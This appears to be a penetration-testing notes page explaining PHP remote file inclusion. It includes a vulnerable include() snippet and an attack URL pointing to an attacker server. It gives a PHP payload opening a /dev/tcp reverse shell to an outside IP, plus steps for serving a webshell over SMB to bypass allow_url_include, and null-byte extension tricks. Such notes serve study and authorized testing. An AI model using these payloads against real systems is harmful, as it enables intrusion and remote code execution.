# Remote File Inclusion \(RFI\)

Remote file inclusion uses pretty much the same vector as local file inclusion.

A remote file inclusion vulnerability lets the attacker execute a script on the target-machine even though it is not even hosted on that machine.

RFI's are less common than LFI. Because in order to get them to work the developer must have edited the `php.ini` configuration file.

This is how they work.

So you have an unsanitized parameter, like this

```text
$incfile = $_REQUEST["file"];
include($incfile.".php");
```

Now what you can do is to include a file that is not hosted on the victim-server, but instead on the attackers server.

```text
http://exampe.com/index.php?page=http://attackerserver.com/evil.txt
```

And evil.txt will look like something like this:

```text
<?php echo shell_exec("whoami");?>

# Or just get a reverse shell directly like this:
<?php echo system("0<&196;exec 196<>/dev/tcp/10.11.0.191/443; sh <&196 >&196 2>&196"); ?>
```

So when the victim-server includes this file it will automatically execute the commands that are in the evil.txt file. And we have a RCE.

### Serving with SMB to bypass PHP config "allow\_url\_include" 

"allow\_url\_include" wrapper by-default set to "Off" which instruct PHP not to load remote HTTP or FTP URLs and hence prevent Remote File Inclusion attack. But, PHP does not block SMB URL loading even if "allow\_url\_include" and "allow\_url\_fopen" both are set to "Off". **This behaviour of PHP can be abused to load remotely hosted PHP web shell from SMB share.** set up an SMB share: 

```text
mkdir /var/www/html/pub/ 
chmod 0555 /var/www/html/pub/
chown -R nobody:nogroup /var/www/html/pub/
echo > /etc/samba/smb.conf  # Remove all SMB config
```

Now, edit the sambaconfig and insert the following:

```text
	[global]
	workgroup = WORKGROUP
	server string = Samba Server %v
	netbios name = indishell-lab
	security = user
	map to guest = bad user
	name resolve order = bcast host
	dns proxy = no
	bind interfaces only = yes
	
	[ica]
	path = /var/www/html/pub
	writable = no
	guest ok = yes
	guest only = yes
	read only = yes
	directory mode = 0555
	force user = nobody
```

Now, we want to host a php shell in the samba directory: I used this for now, decent shell: [https://github.com/WhiteWinterWolf/wwwolf-php-webshell/blob/master/webshell.php](https://github.com/WhiteWinterWolf/wwwolf-php-webshell/blob/master/webshell.php) 

Go back to browser and call the shell: [http://10.10.10.151/blog/?lang=\\10.10.14.22\ica\webshell.php](http://10.10.10.151/blog/?lang=\\10.10.14.22\ica\webshell.php)

### Avoid extentions <a id="avoid-extentions"></a>

Remember to add the nullbyte `%00` to avoid appending `.php`. This will only work on php before version 5.3.

If it does not work you can also add a `?`, this way the rest will be interpreted as url parameters.

